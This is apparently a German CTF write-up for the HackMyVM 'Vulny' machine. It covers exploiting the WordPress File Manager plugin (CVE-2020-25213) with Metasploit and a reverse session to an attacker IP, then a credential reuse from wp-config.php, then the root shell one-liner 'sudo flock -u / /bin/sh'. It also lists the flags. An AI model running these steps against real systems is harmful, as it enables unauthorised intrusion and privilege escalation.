# Vulny - HackMyVM (Easy)
 
![Vulny.png](Vulny.png)

## Übersicht

*   **VM:** Vulny
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Vulny)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 8. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Vulny_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Vulny"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), auf dem eine WordPress-Installation im Unterverzeichnis `/secret/` gefunden wurde. Über das Metasploit-Modul `exploit/multi/http/wp_file_manager_rce` (ausnutzend CVE-2020-25213 im File Manager Plugin) wurde eine Meterpreter-Session als `www-data` erlangt. Als `www-data` konnte die Datei `/usr/share/wordpress/wp-config.php` gelesen werden, die das Passwort `idrinksomewater` für den Datenbankbenutzer enthielt. Dieses Passwort funktionierte auch für den Linux-Benutzer `adrian`, zu dem mittels `su` gewechselt wurde. Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Die Privilegieneskalation zu Root erfolgte durch Ausnutzung einer unsicheren `sudo`-Regel: `adrian` durfte `/usr/bin/flock` als `root` ohne Passwort ausführen. Durch den Befehl `sudo flock -u / /bin/sh` wurde eine Root-Shell erlangt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `msfconsole` (Metasploit Framework)
*   `meterpreter`
*   `python3` (für Shell-Stabilisierung)
*   `cat`
*   `ls`
*   `su`
*   `sudo`
*   `flock`
*   `sh`
*   `id`
*   Standard Linux-Befehle (`cd`, `export`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Vulny" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.125`).
    *   `nmap`-Scan identifizierte offene Ports: 80 (HTTP - Apache 2.4.41 "It works") und 33060 (mysqlx?).
    *   `gobuster` auf Port 80 fand das Verzeichnis `/secret/`, das eine WordPress-Installation enthielt.

2.  **Initial Access (WordPress RCE zu `www-data`):**
    *   Verwendung von Metasploit: `search wp-file-manager` fand `exploit/multi/http/wp_file_manager_rce`.
    *   Konfiguration des Exploits: `set rhost 192.168.2.125`, `set lhost [Angreifer-IP]`, `set targeturi /secret`, `set ForceExploit true`.
    *   Ausführung des Exploits (`run`) führte zu einer Meterpreter-Session als `www-data`.
    *   Wechsel zu einer System-Shell (`shell`) und Stabilisierung dieser (Python PTY, `export TERM=xterm`).

3.  **Privilege Escalation (von `www-data` zu `adrian`):**
    *   Als `www-data` wurde die Datei `/usr/share/wordpress/wp-config.php` gelesen. *Der genaue Inhalt/Passwort-Extraktion ist im Log nicht gezeigt, aber das Passwort `idrinksomewater` wird im nächsten Schritt verwendet.*
    *   Identifizierung des Benutzers `adrian` durch `ls /home`.
    *   Wechsel zum Benutzer `adrian` mittels `su adrian` und dem Passwort `idrinksomewater`.
    *   User-Flag `HMViuploadfiles` in `/home/adrian/user.txt` gelesen.

4.  **Privilege Escalation (von `adrian` zu `root` via `sudo flock`):**
    *   `sudo -l` als `adrian` zeigte: `(ALL : ALL) NOPASSWD: /usr/bin/flock`.
    *   Ausnutzung dieser Regel durch `sudo flock -u / /bin/sh`.
    *   Erlangung einer Root-Shell.
    *   Root-Flag `HMVididit` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Veraltetes WordPress-Plugin (File Manager CVE-2020-25213):** Anfällig für nicht authentifizierte Remote Code Execution, ausgenutzt mit Metasploit.
*   **Klartext-Credentials in `wp-config.php`:** Datenbankpasswort war lesbar für `www-data`.
*   **Passwort-Wiederverwendung:** Das Datenbankpasswort war identisch mit dem Linux-Passwort des Benutzers `adrian`.
*   **Unsichere `sudo`-Konfiguration (`flock`):** Die Erlaubnis, `/usr/bin/flock` als `root` ohne Passwort auszuführen, ermöglichte durch Starten einer Shell die Erlangung von Root-Rechten.

## Flags

*   **User Flag (`/home/adrian/user.txt`):** `HMViuploadfiles`
*   **Root Flag (`/root/root.txt`):** `HMVididit`

## Tags

`HackMyVM`, `Vulny`, `Easy`, `WordPress`, `File Manager Plugin`, `CVE-2020-25213`, `Metasploit`, `RCE`, `wp-config.php`, `Password Reuse`, `sudo Exploitation`, `flock`, `Privilege Escalation`, `Linux`, `Web`
